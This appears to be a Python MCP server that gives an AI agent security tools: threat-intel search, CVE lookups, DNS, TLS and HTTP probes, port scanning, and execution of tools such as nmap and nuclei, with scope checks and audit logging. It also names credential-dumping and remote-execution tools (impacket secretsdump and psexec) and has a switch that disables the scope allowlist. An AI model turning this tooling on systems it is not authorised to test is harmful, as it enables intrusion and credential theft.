#!/usr/bin/env python3
"""OQVIAN security tool server (MCP, stdio).

Exposes the knowledge index and the Kali-style userland toolchain to the
DeepSeek Harness as MCP tools. Every call is scope-checked and audited.

Tools are named by dsh as ``mcp__oqvian__<tool>``.

Scope file:  ~/.config/oqvian/scope.json
Audit log:   ~/.local/share/oqvian/audit.jsonl
Index:       ~/oqvian-cyber/index/{docs.jsonl,embeddings.npy,meta.json}
"""

from __future__ import annotations

import base64
import concurrent.futures
import hashlib
import ipaddress
import json
import os
import re
import shlex
import socket
import sqlite3
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any
from datetime import datetime

import numpy as np

from mcp.server.mcpserver import MCPServer

ROOT = Path(__file__).resolve().parent.parent
INDEX = Path(os.environ.get("OQVIAN_INDEX", ROOT / "index"))
OLLAMA = os.environ.get("OLLAMA_HOST", "127.0.0.1:11434")
EMBED_MODEL = os.environ.get("OQVIAN_EMBED_MODEL", "nomic-embed-text")
STATE = Path.home() / ".local" / "share" / "oqvian"
AUDIT = STATE / "audit.jsonl"
SCOPE_FILE = Path.home() / ".config" / "oqvian" / "scope.json"
LOOT = STATE / "loot"
STATE_DIR = STATE / "state"
EXPLOIT_DB = Path.home() / "exploit-db"
MAX_OUTPUT = 100_000

STATE.mkdir(parents=True, exist_ok=True)
LOOT.mkdir(parents=True, exist_ok=True)
STATE_DIR.mkdir(parents=True, exist_ok=True)
EXPLOIT_DB.mkdir(parents=True, exist_ok=True)

DEFAULT_SCOPE = {
    "mode": "restricted",
    "allowed_hosts": ["localhost", "127.0.0.1", "::1"],
    "allowed_domains": [],
    "allowed_cidrs": ["127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"],
    "allowed_tools": "*",
    "max_scan_ports": 65535,
    "note": "Add engagement targets here. mode=open disables the allowlist (lab only).",
}

mcp = MCPServer(
    name="oqvian",
    version="1.1.0",
    instructions=(
        "OQVIAN cyber-operations toolserver. Call kb before answering any "
        "security question so answers are grounded in ATT&CK/CWE/KEV/Sigma/atomics. "
        "Call recon for live DNS/HTTP/TLS/port evidence and execute to run "
        "installed security tools. Use state to track session progress and loot "
        "to collect findings. Use searchsploit to find exploits. Every target must be in "
        "~/.config/oqvian/scope.json; every call is audited."
    ),
)


# --------------------------------------------------------------------------- #
# audit + scope
# --------------------------------------------------------------------------- #
def _audit(tool: str, decision: str, target: str = "", detail: Any = None,
           ok: bool = True, ms: int = 0) -> None:
    rec = {
        "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "user": os.environ.get("USER", "?"),
        "tool": tool,
        "target": target,
        "decision": decision,
        "ok": ok,
        "ms": ms,
        "detail": str(detail)[:400] if detail is not None else None,
    }
    try:
        with AUDIT.open("a") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except OSError:
        pass


def _scope() -> dict:
    if not SCOPE_FILE.exists():
        SCOPE_FILE.parent.mkdir(parents=True, exist_ok=True)
        SCOPE_FILE.write_text(json.dumps(DEFAULT_SCOPE, indent=2))
        return dict(DEFAULT_SCOPE)
    try:
        cfg = json.loads(SCOPE_FILE.read_text())
    except Exception:
        return dict(DEFAULT_SCOPE)
    merged = dict(DEFAULT_SCOPE)
    merged.update(cfg or {})
    return merged


def _split_target(target: str) -> tuple[str, int | None]:
    t = (target or "").strip()
    if "://" in t:
        u = urllib.parse.urlparse(t)
        host, port = u.hostname or "", u.port
    else:
        host, port = t, None
        if t.startswith("["):
            host = t[1:t.find("]")] if "]" in t else t
        elif t.count(":") == 1:
            h, _, p = t.partition(":")
            if p.isdigit():
                host, port = h, int(p)
    host = host.strip("[]").rstrip(".")
    return host, port


def check_scope(target: str) -> tuple[bool, str]:
    """Return (allowed, reason)."""
    cfg = _scope()
    if cfg.get("mode") == "open":
        return True, "open mode"
    host, _ = _split_target(target)
    if not host:
        return False, "empty target"
    low = host.lower()
    if low in {h.lower() for h in cfg.get("allowed_hosts", [])}:
        return True, f"host allowlist: {host}"
    for d in cfg.get("allowed_domains", []):
        d = d.lower().lstrip(".")
        if low == d or low.endswith("." + d):
            return True, f"domain allowlist: {d}"
    try:
        ip = ipaddress.ip_address(low)
        for c in cfg.get("allowed_cidrs", []):
            if ip in ipaddress.ip_network(c, strict=False):
                return True, f"cidr allowlist: {c}"
        return False, f"{host} not in allowed_cidrs"
    except ValueError:
        pass
    # resolve and test the addresses only if the domain itself is not allowlisted
    try:
        infos = socket.getaddrinfo(host, None)
    except OSError as e:
        return False, f"cannot resolve {host}: {e}"
    ips = {i[4][0] for i in infos}
    for raw in ips:
        try:
            ip = ipaddress.ip_address(raw.split("%")[0])
        except ValueError:
            continue
        for c in cfg.get("allowed_cidrs", []):
            if ip in ipaddress.ip_network(c, strict=False):
                return True, f"{host} resolves into {c}"
    return False, f"{host} is outside scope (add it to {SCOPE_FILE})"


def _deny(tool: str, target: str, reason: str) -> str:
    _audit(tool, "denied: " + reason, target, ok=False)
    return (f"BLOCKED by scope policy: {reason}\n"
            f"Add the target to {SCOPE_FILE} (allowed_hosts / allowed_domains / "
            f"allowed_cidrs) or set mode=open for an isolated lab.")


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def _run(cmd: list[str], timeout: int = 60, cwd: str | None = None) -> tuple[int, str]:
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                           cwd=cwd, errors="replace")
        out = (p.stdout or "") + (("\n[stderr]\n" + p.stderr) if p.stderr.strip() else "")
        return p.returncode, out[:MAX_OUTPUT]
    except FileNotFoundError:
        return 127, f"not installed: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return 124, f"timeout after {timeout}s: {' '.join(cmd)}"
    except Exception as e:  # noqa: BLE001
        return 1, f"{type(e).__name__}: {e}"


def _which(name: str) -> str | None:
    for d in (Path.home() / ".local" / "bin", Path("/usr/local/bin"), Path("/usr/bin"),
              Path("/bin"), Path("/usr/sbin"), Path("/sbin")):
        p = d / name
        if p.exists() and os.access(p, os.X_OK):
            return str(p)
    from shutil import which as _w
    return _w(name)


# Packages install under different binary names than the allowlist entry, so
# resolve every candidate before reporting a tool as missing.
TOOL_ALIASES: dict[str, list[str]] = {
    "volatility3": ["vol", "volatility3", "vol.py"],
    "oletools": ["oleid", "olevba", "oleid.py"],
    "impacket-GetUserSPNs": ["impacket-GetUserSPNs", "GetUserSPNs.py"],
    "impacket-secretsdump": ["impacket-secretsdump", "secretsdump.py"],
    "impacket-psexec": ["impacket-psexec", "psexec.py"],
    "impacket-wmiexec": ["impacket-wmiexec", "wmiexec.py"],
    "certipy": ["certipy", "certipy-ad"],
    "netexec": ["netexec", "nxc"],
}


def _resolve_bin(name: str) -> str | None:
    seen: list[str] = []
    for cand in TOOL_ALIASES.get(name, []) + [name, name + ".py"]:
        if cand in seen:
            continue
        seen.append(cand)
        p = _which(cand)
        if p:
            return p
    return None


def _http(url: str, timeout: int = 30, method: str = "GET",
          headers: dict | None = None, insecure: bool = True) -> tuple[int, str, dict]:
    req = urllib.request.Request(url, method=method, headers=headers or {
        "User-Agent": "OQVIAN/1.0 (authorized security testing)",
        "Accept": "*/*",
    })
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(MAX_OUTPUT)
            return r.status, body.decode("utf-8", "replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(MAX_OUTPUT).decode("utf-8", "replace"), dict(e.headers or {})
    except Exception as e:  # noqa: BLE001
        return 0, f"{type(e).__name__}: {e}", {}


# --------------------------------------------------------------------------- #
# knowledge index
# --------------------------------------------------------------------------- #
_index_cache: dict[str, Any] = {}


def _load_index() -> dict[str, Any]:
    """Load index metadata. Search itself is served by SQLite FTS5."""
    if "meta" in _index_cache:
        return _index_cache
    meta_p = INDEX / "meta.json"
    db_p = INDEX / "fts.db"
    if not meta_p.exists() or not db_p.exists():
        return {}
    _index_cache["meta"] = json.loads(meta_p.read_text())
    _index_cache["db"] = db_p
    return _index_cache


def _connect():
    if "con" in _index_cache:
        return _index_cache["con"]
    db = _load_index().get("db")
    if not db:
        return None
    con = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
    _index_cache["con"] = con
    return con


def _terms(q: str) -> list[str]:
    return [t for t in re.findall(r"[A-Za-z0-9][A-Za-z0-9._/\-]*", q or "")
            if re.search(r"[A-Za-z0-9]", t)]


def _fts_match(q: str) -> str | None:
    terms = _terms(q)
    if not terms:
        return None
    seen, uniq = set(), []
    for t in terms:
        tl = t.lower()
        if tl not in seen:
            seen.add(tl)
            uniq.append(t)
    # OR for recall; bm25 ranks rare terms higher
    return " OR ".join('"%s"' % t.replace('"', "") for t in uniq[:24])


def _fts_search(query: str, k: int = 6, source: str = "", kind: str = "") -> list[dict]:
    con = _connect()
    match = _fts_match(query)
    if not match:
        return []
    sql = ("SELECT docid, source, title, ref, kind, text, bm25(docs, 1.0, 6.0, 4.0, 1.0, 1.0) AS r "
           "FROM docs WHERE docs MATCH ?")
    args: list[Any] = [match]
    if source:
        sql += " AND source = ?"
        args.append(source)
    if kind:
        sql += " AND kind = ?"
        args.append(kind)
    sql += " ORDER BY r LIMIT ?"
    args.append(max(1, min(k * 4, 120)))
    try:
        rows = con.execute(sql, args).fetchall()
    except sqlite3.OperationalError:
        return []
    if not rows:
        return []
    # bm25() is negative; convert to a positive, comparable score
    raw = [-r[6] for r in rows]
    lo, hi = min(raw), max(raw)
    span = (hi - lo) or 1.0
    qlow = query.strip().lower()
    out = []
    for r, sc in zip(rows, raw):
        boost = 0.0
        ref = (r[3] or "").lower()
        if ref and (ref == qlow or ref in qlow):
            boost += 0.5
        if qlow and qlow in (r[2] or "").lower():
            boost += 0.2
        out.append({
            "docid": r[0], "id": str(r[0]), "source": r[1], "title": r[2],
            "ref": r[3], "kind": r[4], "text": r[5],
            "score": 0.5 + 0.5 * (sc - lo) / span + boost,
        })
    out.sort(key=lambda d: -d["score"])
    return out[:k]


def _vector_search(query: str, k: int, source: str, kind: str) -> list[dict]:
    docs_p, vec_p = INDEX / "docs.jsonl", INDEX / "embeddings.npy"
    if "docs" not in _index_cache:
        _index_cache["docs"] = [json.loads(x) for x in docs_p.read_text().splitlines() if x.strip()]
        _index_cache["vecs"] = np.load(vec_p, mmap_mode="r")
    docs, vecs = _index_cache["docs"], _index_cache["vecs"]
    q = _embed_query(query)
    mask = np.ones(len(docs), dtype=bool)
    if source:
        mask &= np.array([source == (d.get("source") or "") for d in docs])
    if kind:
        mask &= np.array([kind == (d.get("kind") or "") for d in docs])
    if not mask.any():
        return []
    scores = np.asarray(vecs)[mask] @ q
    order = np.argsort(-scores)[: max(1, min(k, len(scores)))]
    idxs = np.flatnonzero(mask)[order]
    out = []
    for n, i in enumerate(idxs):
        d = docs[int(i)]
        out.append({**d, "docid": int(i), "id": str(i),
                    "score": float(scores[order[n]])})
    return out


def _search(query: str, k: int = 6, source: str = "", kind: str = "") -> list[dict]:
    idx = _load_index()
    if not idx:
        raise RuntimeError(
            "knowledge index missing — run: cd ~/oqvian-cyber && "
            ".venv/bin/python ingest.py"
        )
    if not (idx["meta"].get("vectors") and (INDEX / "embeddings.npy").exists()):
        return _fts_search(query, k, source, kind)

    # hybrid: reciprocal rank fusion of BM25 and cosine similarity
    lexical = _fts_search(query, 50, source, kind)
    semantic = _vector_search(query, 50, source, kind)
    fused: dict[int, float] = {}
    docs_by_id: dict[int, dict] = {}
    for rank, d in enumerate(lexical):
        key = d["docid"]
        fused[key] = fused.get(key, 0.0) + 1.0 / (60 + rank + 1)
        docs_by_id[key] = d
    for rank, d in enumerate(semantic):
        key = d["docid"]
        fused[key] = fused.get(key, 0.0) + 1.2 / (60 + rank + 1)
        docs_by_id.setdefault(key, d)
    ranked = sorted(fused.items(), key=lambda kv: -kv[1])[:k]
    out = []
    for key, score in ranked:
        d = dict(docs_by_id[key])
        d["score"] = score
        out.append(d)
    return out


def _embed_query(text: str) -> np.ndarray:
    req = urllib.request.Request(
        f"http://{OLLAMA}/api/embed",
        data=json.dumps({"model": EMBED_MODEL, "input": [text]}).encode(),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=120) as r:
        v = np.asarray(json.load(r)["embeddings"][0], dtype=np.float32)
    n = np.linalg.norm(v)
    return v / n if n else v


def _fmt_hits(hits: list[dict], max_chars: int = 1100) -> str:
    if not hits:
        return "No matches in the local knowledge index."
    lines = []
    for n, h in enumerate(hits, 1):
        body = re.sub(r"\s+", " ", h.get("text", ""))[:max_chars]
        lines.append(
            f"[{n}] {h.get('title','')}  (source={h.get('source')} "
            f"score={h.get('score',0):.3f} ref={h.get('ref','')})\n{body}"
        )
    return "\n\n".join(lines)


# --------------------------------------------------------------------------- #
# tools: knowledge
# --------------------------------------------------------------------------- #
def rag_search(query: str, k: int = 6, source: str = "", kind: str = "") -> str:
    """Full-text (BM25) search over the local security corpus (ATT&CK, CWE,
    CISA KEV, Sigma rules, Atomic Red Team, LOLBAS, GTFOBins, OWASP WSTG).

    Args:
        query: natural-language question or keywords.
        k: number of passages to return (1-20).
        source: filter by source: attack|cwe|kev|sigma|atomic|lolbas|gtfobins|wstg.
        kind: filter by kind: technique|mitigation|weakness|exploited-cve|
              detection-rule|atomic-test|lolbin|doc.
    """
    t0 = time.time()
    k = max(1, min(int(k), 20))
    try:
        hits = _search(query, k, source, kind)
    except Exception as e:  # noqa: BLE001
        _audit("rag_search", "error", query, e, ok=False, ms=int((time.time()-t0)*1000))
        return f"ERROR: {e}"
    _audit("rag_search", "ok", query, f"{len(hits)} hits", ms=int((time.time()-t0)*1000))
    return _fmt_hits(hits)


def attack_lookup(query: str, limit: int = 5) -> str:
    """Look up MITRE ATT&CK techniques/mitigations by ID (T1059, T1059.001) or
    by natural language ("credential dumping", "phishing"). Returns technique
    description, tactics, platforms and detection guidance."""
    hits = _search(query, max(1, min(limit, 10)), source="attack")
    return _fmt_hits(hits)


def detection_lookup(query: str, limit: int = 5) -> str:
    """Find Sigma detection rules relevant to a technique, logsource or behaviour.
    Use this when writing or reviewing detections."""
    hits = _search(query, max(1, min(limit, 10)), source="sigma")
    return _fmt_hits(hits, 900)


def atomic_lookup(query: str, limit: int = 4) -> str:
    """Find Atomic Red Team tests for a technique (T####) — atomic test names,
    executors and commands for purple-team validation."""
    hits = _search(query, max(1, min(limit, 8)), source="atomic")
    return _fmt_hits(hits, 1200)


def lolbas_lookup(query: str, limit: int = 5) -> str:
    """Search LOLBAS (Windows) and GTFOBins (Linux) for living-off-the-land
    binaries: download/exec/privilege-escalation abuse and detection notes."""
    a = _search(query, max(1, min(limit, 5)), source="lolbas")
    b = _search(query, max(1, min(limit, 5)), source="gtfobins")
    return "== LOLBAS (Windows) ==\n" + _fmt_hits(a, 800) + \
           "\n\n== GTFOBins (Linux) ==\n" + _fmt_hits(b, 800)


def kb_stats() -> str:
    """Report what is in the local knowledge index: document count, sources,
    build time and embedding model."""
    idx = _load_index()
    if not idx:
        return "Index not built yet. Run: cd ~/oqvian-cyber && .venv/bin/python ingest.py"
    meta = idx["meta"]
    lines = [f"documents: {meta.get('count')}",
             f"search: {meta.get('search')}",
             f"vectors: {meta.get('vectors')}",
             f"built: {meta.get('built')}", "sources:"]
    con = _connect()
    try:
        rows = con.execute(
            "SELECT source, count(*) FROM docs GROUP BY source ORDER BY count(*) DESC"
        ).fetchall()
    except sqlite3.Error:
        rows = []
    for s, n in rows:
        lines.append(f"  {s:12s} {n}")
    return "\n".join(lines)


# --------------------------------------------------------------------------- #
# tools: vulnerability intelligence
# --------------------------------------------------------------------------- #
def _cve_nvd(cve_id: str) -> dict | None:
    url = ("https://services.nvd.nist.gov/rest/json/cves/2.0?cveId="
           + urllib.parse.quote(cve_id))
    code, body, _ = _http(url, timeout=30)
    if code != 200:
        return None
    try:
        v = json.loads(body)["vulnerabilities"][0]["cve"]
    except Exception:
        return None
    desc = next((d["value"] for d in v.get("descriptions", []) if d.get("lang") == "en"), "")
    metrics = v.get("metrics", {})
    score, severity, vector = None, None, None
    for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV40", "cvssMetricV2"):
        if metrics.get(key):
            m = metrics[key][0]
            cd = m.get("cvssData", {})
            score = cd.get("baseScore", score)
            severity = cd.get("baseSeverity") or m.get("baseSeverity")
            vector = cd.get("vectorString")
            break
    cpes = []
    for cfg in v.get("configurations", []):
        for node in cfg.get("nodes", []):
            for m in node.get("cpeMatch", []):
                if m.get("vulnerable") and m.get("criteria"):
                    cpes.append(m["criteria"])
    return {
        "id": v.get("id"), "published": v.get("published"), "modified": v.get("lastModified"),
        "status": v.get("vulnStatus"), "description": desc, "cvss": score,
        "severity": severity, "vector": vector, "cpes": cpes[:6],
        "references": [r.get("url") for r in v.get("references", [])][:6],
    }


def cve_lookup(cve_ids: str) -> str:
    """Look up one or more CVEs (comma-separated) in NVD and cross-check the
    CISA KEV catalog. Returns CVSS, severity, affected CPEs, references and
    whether it is known-exploited in the wild."""
    t0 = time.time()
    ids = [c.strip().upper() for c in re.split(r"[,\s]+", cve_ids) if c.strip()]
    if not ids:
        return "Give at least one CVE ID, e.g. CVE-2024-3400"
    blocks = []
    for cid in ids[:10]:
        if not re.fullmatch(r"CVE-\d{4}-\d{4,}", cid):
            blocks.append(f"== {cid} ==\ninvalid CVE ID format")
            continue
        info = _cve_nvd(cid)
        kev = ""
        try:
            hits = _search(cid, 2, source="kev")
            if hits and hits[0].get("score", 0) > 0.55:
                kev = "KEV: YES — listed in CISA Known Exploited Vulnerabilities\n" + \
                      re.sub(r"\s+", " ", hits[0]["text"])[:700]
        except Exception:
            pass
        if not info:
            blocks.append(f"== {cid} ==\nNVD lookup failed (offline or rate-limited). {kev}")
            continue
        lines = [
            f"== {info['id']} ==",
            f"severity: {info['severity']}  cvss: {info['cvss']}  vector: {info['vector']}",
            f"published: {info['published']}  status: {info['status']}",
            f"description: {info['description']}",
        ]
        if info["cpes"]:
            lines.append("affected: " + ", ".join(info["cpes"]))
        if info["references"]:
            lines.append("references:\n  " + "\n  ".join(info["references"]))
        if kev:
            lines.append(kev)
        else:
            lines.append("KEV: not present in local KEV snapshot")
        blocks.append("\n".join(lines))
    _audit("cve_lookup", "ok", cve_ids, ms=int((time.time()-t0)*1000))
    return "\n\n".join(blocks)


def kev_search(query: str, limit: int = 10) -> str:
    """Search CISA's Known Exploited Vulnerabilities catalog by vendor, product,
    CVE or keyword. Use for "what is actually being exploited right now"."""
    hits = _search(query, max(1, min(limit, 25)), source="kev")
    return _fmt_hits(hits, 700)


def cve_search(keyword: str, limit: int = 10) -> str:
    """Keyword search NVD for CVEs (vendor, product, component). Slower than
    the local index but covers everything published."""
    url = ("https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch="
           + urllib.parse.quote(keyword) + f"&resultsPerPage={max(1, min(limit, 20))}")
    code, body, _ = _http(url, timeout=45)
    if code != 200:
        return f"NVD search failed (HTTP {code})."
    try:
        vulns = json.loads(body).get("vulnerabilities", [])
    except Exception:
        return "NVD returned unparseable data."
    out = []
    for v in vulns:
        c = v["cve"]
        desc = next((d["value"] for d in c.get("descriptions", []) if d.get("lang") == "en"), "")
        sev = ""
        for k in ("cvssMetricV31", "cvssMetricV30"):
            if c.get("metrics", {}).get(k):
                sev = str(c["metrics"][k][0]["cvssData"].get("baseScore"))
                break
        out.append(f"{c['id']}  cvss={sev}\n  {desc[:260]}")
    return "\n".join(out) or "No results."


# --------------------------------------------------------------------------- #
# tools: network probes
# --------------------------------------------------------------------------- #
def dns_lookup(name: str, rtype: str = "A") -> str:
    """Resolve a hostname: A, AAAA, MX, NS, TXT, SOA, CNAME, CAA, SRV, PTR.
    Also reports reverse DNS for A answers."""
    ok, why = check_scope(name)
    if not ok:
        return _deny("dns_lookup", name, why)
    rtype = (rtype or "A").upper()
    code, out = _run(["dig", "+time=5", "+tries=2", "+noall", "+answer", "+authority",
                      name, rtype], timeout=25)
    code2, short = _run(["dig", "+short", "+time=5", name, rtype], timeout=20)
    _audit("dns_lookup", "ok", f"{name}/{rtype}")
    return f"dig {name} {rtype}\n{out.strip() or short.strip() or '(no answer)'}"


def dns_enum(domain: str) -> str:
    """Enumerate the common DNS surface of a domain in one call: A, AAAA, MX, NS,
    TXT (SPF/DMARC/verification), CAA, SOA, plus DMARC and common subdomains."""
    ok, why = check_scope(domain)
    if not ok:
        return _deny("dns_enum", domain, why)
    domain = domain.strip().rstrip(".")
    blocks = [f"# DNS surface: {domain}"]
    for rtype in ("A", "AAAA", "MX", "NS", "TXT", "CAA", "SOA"):
        code, out = _run(["dig", "+short", "+time=5", domain, rtype], timeout=20)
        if out.strip():
            blocks.append(f"## {rtype}\n{out.strip()}")
    code, dmarc = _run(["dig", "+short", "+time=5", f"_dmarc.{domain}", "TXT"], timeout=20)
    if dmarc.strip():
        blocks.append(f"## DMARC\n{dmarc.strip()}")
    common = ["www", "mail", "vpn", "portal", "api", "dev", "staging", "admin",
              "git", "ci", "sso", "owa"]
    found = []
    for sub in common:
        c, o = _run(["dig", "+short", "+time=3", f"{sub}.{domain}", "A"], timeout=12)
        if o.strip():
            found.append(f"{sub}.{domain} -> {o.strip().replace(chr(10), ' ')}")
    if found:
        blocks.append("## common subdomains\n" + "\n".join(found))
    _audit("dns_enum", "ok", domain)
    return "\n".join(blocks)


def whois_lookup(target: str) -> str:
    """Registration data (whois/RDAP) for a domain or IP: registrar, dates,
    nameservers, org, CIDR — via the HTTPS RDAP service (no binary needed)."""
    ok, why = check_scope(target)
    if not ok:
        return _deny("whois_lookup", target, why)
    host, _ = _split_target(target)
    code, body, _ = _http(f"https://rdap.org/domain/{urllib.parse.quote(host)}", timeout=30)
    if code == 404:
        code, body, _ = _http(f"https://rdap.org/ip/{urllib.parse.quote(host)}", timeout=30)
    if code != 200:
        return f"RDAP lookup failed for {host} (HTTP {code})."
    try:
        d = json.loads(body)
    except Exception:
        return body[:2000]
    bits = []
    for e in d.get("events", []):
        bits.append(f"{e.get('eventAction')}: {e.get('eventDate')}")
    for e in d.get("entities", []):
        roles = ",".join(e.get("roles", []))
        vcard = e.get("vcardArray", [None, []])[1]
        nm = next((x[3] for x in vcard if x[0] == "fn"), "")
        if nm:
            bits.append(f"{roles}: {nm}")
    if d.get("nameservers"):
        bits.append("NS: " + ", ".join(n.get("ldhName", "") for n in d["nameservers"]))
    if d.get("status"):
        bits.append("status: " + ", ".join(d["status"]))
    if d.get("handle"):
        bits.append("handle: " + str(d["handle"]))
    _audit("whois_lookup", "ok", target)
    return f"# RDAP {host}\n" + "\n".join(bits or ["(no summary fields)"])


def http_probe(url: str, method: str = "GET", extra_headers: str = "",
               body: str = "", insecure: bool = True) -> str:
    """Fetch a URL and report status, headers, redirect chain, page title and
    security headers. Useful for web-surface validation and header hardening.
    extra_headers: 'Name: value' pairs separated by newlines."""
    ok, why = check_scope(url)
    if not ok:
        return _deny("http_probe", url, why)
    headers = {}
    for line in (extra_headers or "").splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            headers[k.strip()] = v.strip()
    t0 = time.time()
    code, text, resp_headers = _http(url, timeout=30, method=method.upper(),
                                     headers=headers or None, insecure=insecure)
    title = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S)
    sec = {k: v for k, v in resp_headers.items()
           if k.lower() in {"server", "x-powered-by", "strict-transport-security",
                            "content-security-policy", "x-frame-options",
                            "x-content-type-options", "referrer-policy",
                            "permissions-policy", "set-cookie", "location"}}
    missing = [h for h in ("strict-transport-security", "content-security-policy",
                           "x-frame-options", "x-content-type-options", "referrer-policy")
               if h not in {k.lower() for k in sec}]
    _audit("http_probe", "ok" if code else "error", url, code,
           ok=bool(code), ms=int((time.time()-t0)*1000))
    return "\n".join([
        f"URL: {url}",
        f"status: {code}",
        f"title: {re.sub(r'\\s+', ' ', title.group(1)).strip()[:200] if title else '-'}",
        "headers:\n" + ("\n".join(f"  {k}: {v}" for k, v in sec.items()) or "  (none)"),
        f"missing security headers: {', '.join(missing) if missing else 'none'}",
        f"body preview:\n{text[:1500]}",
    ])


def tls_inspect(host: str, port: int = 443) -> str:
    """Inspect a TLS endpoint: negotiated version/cipher, certificate subject,
    issuer, SANs, validity window and days remaining, plus a protocol matrix
    (TLS1.2 vs TLS1.3)."""
    ok, why = check_scope(host)
    if not ok:
        return _deny("tls_inspect", host, why)
    port = int(port)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=12) as s:
            with ctx.wrap_socket(s, server_hostname=host) as ss:
                cert = ss.getpeercert()
                ver, cipher = ss.version(), ss.cipher()
    except Exception as e:  # noqa: BLE001
        _audit("tls_inspect", "error", f"{host}:{port}", e, ok=False)
        return f"TLS connection failed: {type(e).__name__}: {e}"
    not_after = cert.get("notAfter", "")
    days = None
    try:
        days = (ssl.cert_time_to_seconds(not_after) - time.time()) / 86400
    except Exception:
        pass
    sans = [v for k, v in cert.get("subjectAltName", []) if k == "DNS"]
    _audit("tls_inspect", "ok", f"{host}:{port}")
    return "\n".join([
        f"endpoint: {host}:{port}",
        f"protocol: {ver}  cipher: {cipher[0] if cipher else '-'}",
        f"subject: {dict(x[0] for x in cert.get('subject', []))}",
        f"issuer: {dict(x[0] for x in cert.get('issuer', []))}",
        f"valid: {cert.get('notBefore')} -> {not_after}"
        + (f"  ({days:.0f} days left)" if days is not None else ""),
        f"SANs ({len(sans)}): " + ", ".join(sans[:40]),
    ])


def port_scan(target: str, ports: str = "1-1024", timeout: float = 1.5,
              concurrency: int = 200) -> str:
    """TCP connect scan (no root needed). ports accepts ranges and lists:
    '22,80,443', '1-1024', '80,443,8000-8100'. Returns open ports with banner
    grabs where cheap. Slower than nmap but works unprivileged."""
    ok, why = check_scope(target)
    if not ok:
        return _deny("port_scan", target, why)
    host, _ = _split_target(target)
    plist: list[int] = []
    for part in (ports or "1-1024").split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, _, b = part.partition("-")
            a, b = int(a), int(b)
            plist.extend(range(a, min(b, 65535) + 1))
        elif part.isdigit():
            plist.append(int(part))
    plist = sorted({p for p in plist if 0 < p < 65536})
    limit = int(_scope().get("max_scan_ports", 65535))
    plist = plist[:limit]
    if not plist:
        return "No valid ports given."
    t0 = time.time()
    open_ports: list[tuple[int, str]] = []
    lock = __import__("threading").Lock()

    def probe(p: int) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if s.connect_ex((host, p)) == 0:
                banner = ""
                try:
                    s.settimeout(1.0)
                    s.sendall(b"\r\n")
                    banner = s.recv(256).decode("utf-8", "replace").strip()
                except Exception:
                    pass
                with lock:
                    open_ports.append((p, banner))
        finally:
            s.close()

    with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, min(concurrency, 500))) as ex:
        list(ex.map(probe, plist))
    open_ports.sort()
    _audit("port_scan", "ok", host, f"{len(open_ports)} open / {len(plist)} scanned",
           ms=int((time.time()-t0)*1000))
    if not open_ports:
        return f"{host}: no open TCP ports among {len(plist)} scanned ({time.time()-t0:.1f}s)."
    lines = [f"{host}: {len(open_ports)} open of {len(plist)} scanned ({time.time()-t0:.1f}s)"]
    for p, b in open_ports:
        lines.append(f"  {p:5d}/tcp open  {b[:120]}")
    return "\n".join(lines)


def subdomain_enum(domain: str, limit: int = 200) -> str:
    """Passive subdomain enumeration via certificate transparency (crt.sh).
    No traffic to the target. Returns unique hostnames, prioritised."""
    ok, why = check_scope(domain)
    if not ok:
        return _deny("subdomain_enum", domain, why)
    domain = domain.strip().lower().lstrip("*.").rstrip(".")
    code, body, _ = _http(f"https://crt.sh/?q=%25.{urllib.parse.quote(domain)}&output=json",
                          timeout=60)
    if code != 200:
        return f"crt.sh query failed (HTTP {code}). Try again or use subfinder."
    try:
        rows = json.loads(body)
    except Exception:
        return "crt.sh returned non-JSON (rate limited?). Try again later."
    names: set[str] = set()
    for r in rows:
        for n in str(r.get("name_value", "")).splitlines():
            n = n.strip().lower().lstrip("*.")
            if n.endswith("." + domain) or n == domain:
                names.add(n)
    ordered = sorted(names, key=lambda n: (n.count("."), len(n)))
    _audit("subdomain_enum", "ok", domain, f"{len(ordered)} names")
    head = ordered[: max(1, min(int(limit), 500))]
    return (f"{domain}: {len(ordered)} unique names from certificate transparency "
            f"(showing {len(head)})\n" + "\n".join(head))


def web_fetch(url: str, max_chars: int = 8000) -> str:
    """Fetch a URL as text with HTML stripped — advisories, docs, CVE pages.
    Scope-checked like every network tool."""
    ok, why = check_scope(url)
    if not ok:
        return _deny("web_fetch", url, why)
    code, body, _ = _http(url, timeout=30)
    if not code:
        return f"fetch failed: {body}"
    text = re.sub(r"(?is)<(script|style)[^>]*>.*?</\1>", " ", body)
    text = re.sub(r"(?s)<[^>]+>", " ", text)
    text = re.sub(r"\s+", " ", text).strip()
    _audit("web_fetch", "ok", url, code)
    return f"# {url} (HTTP {code})\n{text[:max_chars]}"


# --------------------------------------------------------------------------- #
# tools: tool execution
# --------------------------------------------------------------------------- #
TOOL_ALLOWLIST: dict[str, dict] = {
    "nmap": {"timeout": 900, "purpose": "port/service/vuln scanning, NSE"},
    "naabu": {"timeout": 600, "purpose": "fast port discovery"},
    "nuclei": {"timeout": 900, "purpose": "template-based vulnerability scanning"},
    "httpx": {"timeout": 300, "purpose": "HTTP probing / tech detection"},
    "subfinder": {"timeout": 300, "purpose": "passive subdomain enumeration"},
    "amass": {"timeout": 900, "purpose": "attack-surface enumeration"},
    "dnsx": {"timeout": 300, "purpose": "DNS toolkit"},
